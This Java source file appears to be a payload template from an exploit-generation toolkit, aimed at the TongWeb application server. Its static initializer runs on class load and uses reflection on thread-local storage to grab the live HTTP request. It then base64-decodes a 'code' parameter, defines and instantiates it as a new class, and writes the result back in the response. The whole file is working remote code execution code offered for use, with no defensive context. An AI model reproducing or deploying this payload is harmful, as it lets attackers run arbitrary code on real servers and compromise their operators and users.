package jeg.core.template.tongweb;

import jeg.core.template.inforsuite.InforSuiteCodeExecTpl;

import java.io.Writer;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

public class TongWebCodeExecTpl {
    static {
        try {
            new TongWebCodeExecTpl();
        } catch (Exception e) {
        }
    }
    private static String getReqParamName() {
        return "code";
    }

    public TongWebCodeExecTpl() throws InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        run();
    }

    public void run() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
        List<Thread> taskThreadList = new ArrayList();
        for (Thread thread : threadSet) {
            if (thread.getClass().getName().contains("tongweb.web.util.threads.TaskThread")) {
                // 将目标对象添加到列表中
                taskThreadList.add(thread);
            }
        }

        List<Object> tables = new ArrayList();
        for (Thread thread : taskThreadList) {
            try {
                Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
                threadLocalsField.setAccessible(true);
                Object localMap = threadLocalsField.get(thread);
                Class<?> threadLocalMapClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
                Field tableField = threadLocalMapClass.getDeclaredField("table");
                tableField.setAccessible(true);
                Object table = tableField.get(localMap);
                tables.add(table);
            } catch (Exception e) {
                continue;
            }
        }

        List<Object> values = new ArrayList();
        for (Object table : tables) {
            // 遍历 table 中的项
            try {
                if (table != null && table.getClass().isArray()) {
                    int length = Array.getLength(table);
                    for (int i = 0; i < length; i++) {
                        Object entry = Array.get(table, i);
                        if (entry != null) {
                            // 获取 entry 的 value 字段
                            try {
                                Field valueField = entry.getClass().getDeclaredField("value");
                                valueField.setAccessible(true);
                                Object value = valueField.get(entry);
                                values.add(value);
                            } catch (Exception e) {
                            }
                        }
                    }
                }
            } catch (Exception e) {
            }

        }

        for (Object value : values) {
            if (value != null && value.getClass().getName().equals("com.tongweb.catalina.connector.ThorRequest")) {
                try {
                    // 从 request body 获取参数
                    String code = (String) value.getClass().getSuperclass().getDeclaredMethod("getParameter", String.class).invoke(value, getReqParamName());
                    if (code != null) {
                        Object response = value.getClass().getSuperclass().getDeclaredMethod("getResponse", new Class[0]).invoke(value, new Object[0]);
                        Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
                        writer.write(defineClazz(code));
                        writer.flush();
                        writer.close();
                        break;
                    }
                } catch (Exception ignored) {
                }
            }
        }
    }

    private static String defineClazz(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}